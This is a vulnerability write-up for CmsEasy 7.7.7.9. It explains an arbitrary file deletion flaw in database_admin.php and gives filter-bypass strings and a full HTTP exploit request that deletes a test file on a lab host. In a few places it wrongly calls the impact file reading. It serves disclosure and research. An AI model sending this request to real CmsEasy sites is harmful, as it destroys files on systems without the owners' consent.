# CmsEasy-V7.7.7.9 20240105-Directory Traversal



## Introduce

CmsEasy has a directory traversal vulnerability in `lib/admin/database_admin.php` that allows arbitrary file deletion. Attackers can exploit this vulnerability to traverse directories and delete arbitrary files.



## Analyze

In the `lib/admin/database_admin.php` file, due to insufficient filtering in the `backAll_action` function, directory traversal leads to arbitrary file deletion.

![image-20250123005104482](E:\tmp\cmseasy-1.png)



```php
 function backAll_action(){
        $dir=ROOT.'/data/backup-website';
        if(front::post('submit') &&is_array(front::post('select'))) {
            foreach(front::post('select') as $d) {
                $d = str_replace('#', '', $d);
                $d = str_replace('../', '', $d);
                $d = str_replace('./', '', $d);
                @unlink($dir.'/'.$d);
            }
            front::flash(lang_admin('success').lang_admin('delete').count(front::post('select')).lang_admin('individual').lang_admin('archives').'！');
        }
        $dirs=front::scan($dir);
        $db_dirs=array();
        foreach($dirs as $dir) {
            if(!preg_match('/\.\./',$dir)) $db_dirs[]=service::lockString($dir);
        }
        //var_dump($db_dirs);
        $this->view->db_dirs=$db_dirs;
    }
```

The `front::post` method is equivalent to `$_POST`.

It can be observed that the dangerous function `unlink` is used.
Additionally, the parameter `select` is controllable (an array).

```php
foreach(front::post('select') as $d) {
                $d = str_replace('#', '', $d);
                $d = str_replace('../', '', $d);
                $d = str_replace('./', '', $d);
                @unlink($dir.'/'.$d);
            }
```

Through analysis and filtering, it can be concluded that developers want to avoid arbitrary file reading vulnerabilities caused by path traversal.

However, an attacker can use filter conditions to construct content to achieve arbitrary file reading.

```

Bypass Method 1:
.....///.....///
=>
../../


Bypass Method 2:  # Utilize Windows parsing characteristics (this method only works on Windows).
..\\..\\
```



## Exploit

```http
POST /index.php?case=database&act=backAll&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.0.104:5678
Content-Length: 38
Cache-Control: max-age=0
Origin: http://192.168.0.104:5678
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:5678/index.php?case=admin&act=login&admin_dir=admin&site=default
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
sec-fetch-site: same-origin
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
cookie: loginfalse74c6352c5a281ec5947783b8a186e225=6; PHPSESSID=73sf2og6s5l9qp6507aeofvp19; allowdown=985f28e9d3af52c829b07a025282006b; login_username=admin; login_password=yxx2O2HvK1vseDc6d%253DMBgleqHCHKdC%253DocDZ%253DK%253DMuLxOuV2ab18391e6e61e99aff8e10d05e4ad02
Connection: keep-alive

submit=1&select[]=.....///.....///test.txt
```



Create `1.txt` file to test.

![image-20250123010305574](C:\Users\Rorochan\AppData\Roaming\Typora\typora-user-images\image-20250123010305574.png)



Send the exploit (constructing two levels up in the directory because the trigger point is located in `lib/admin/database_admin.php`).  The response "Template does not exist" is displayed normally, but the deletion was actually successful.

![image-20250123010228909](C:\Users\Rorochan\AppData\Roaming\Typora\typora-user-images\image-20250123010228909.png)



The file can be seen to have been deleted.

![image-20250123010334583](C:\Users\Rorochan\AppData\Roaming\Typora\typora-user-images\image-20250123010334583.png)

